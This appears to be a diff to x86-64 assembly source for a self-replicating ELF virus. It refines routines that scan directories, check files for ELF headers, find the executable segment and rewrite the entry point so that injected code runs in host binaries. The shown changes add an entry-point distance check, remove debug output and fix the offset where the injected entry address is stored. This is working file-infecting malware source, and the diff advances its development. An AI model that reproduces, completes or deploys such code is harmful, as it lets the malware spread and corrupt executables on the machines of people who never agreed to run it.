@@ -98,7 +98,7 @@ _inject:
 	xor rax, rax; = 0
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jne _infected
-	jmp _host
+	jmp _exit
 
 _infect_dir:; (string rdi)
 	push r10
@@ -297,6 +297,7 @@ _infect_file: ; (string rdi, stat rsi)
 	cmp rax, 0x0
 	jl .close ; < 0
 
+
 	push rax
 	pop rsi
 	lea rdi, [rel elf_magic]
@@ -307,12 +308,19 @@ _infect_file: ; (string rdi, stat rsi)
 	pop r13
 	cmp rax, 0x0
 	jne .unmap ; not elf file
+
 	cmp byte[rsi + 16], 2 ; ET_EXEC
 	je .is_elf_file
 	cmp byte[rsi + 16], 3 ; ET_DYN
 	jne .unmap
 
+
+
 	.is_elf_file:
+		mov rsi, [r12 + 48]
+		cmp rsi, [r13 + 24]
+		jl .unmap ; TODO: infect binary where entrypoint is far (/bin/gcc-10)
+
 		%ifdef DEBUG
 			mov rdi, rsi
 			call _print; _print(rdi)
@@ -330,6 +338,8 @@ _infect_file: ; (string rdi, stat rsi)
 		call _ft_strcmp
 		cmp rax, 0x0
 		je .unmap
+
+
 
 		; get pt_load exec
 		mov rsi, [r13 + 32]; e_phoff
@@ -349,16 +359,6 @@ _infect_file: ; (string rdi, stat rsi)
 			and dx, 1 ; PF_X
 			jnz .segment_found
 			.next:
-				%ifdef DEBUG
-					push rdi
-					push rax
-					push rcx
-					lea rdi, [rel signature]
-					call _print
-					pop rcx
-					pop rax
-					pop rdi
-				%endif
 				add rdi, 56; sizeof(Elf64_Phdr)
 			jmp .find_segment_exec
 		.segment_found:
@@ -396,8 +396,7 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rdi, [rbx + 8] ; p_offset
 			mov [rax], rdi
 			mov rdi, [rbx + 32]; p_filesz
-			add [rax], rdi
-;			mov [rax], rdi ; entry_inject
+			add [rax], rdi ; entry_inject
 			add rax, 8
 			mov rdi, [r13 + 24]; entry_prg
 			mov [rax], rdi
@@ -449,9 +448,6 @@ _infect_file: ; (string rdi, stat rsi)
 	pop r11
 	pop r10
 ret
-
-_host:
-	jmp _exit
 
 _infected:
 	push r8
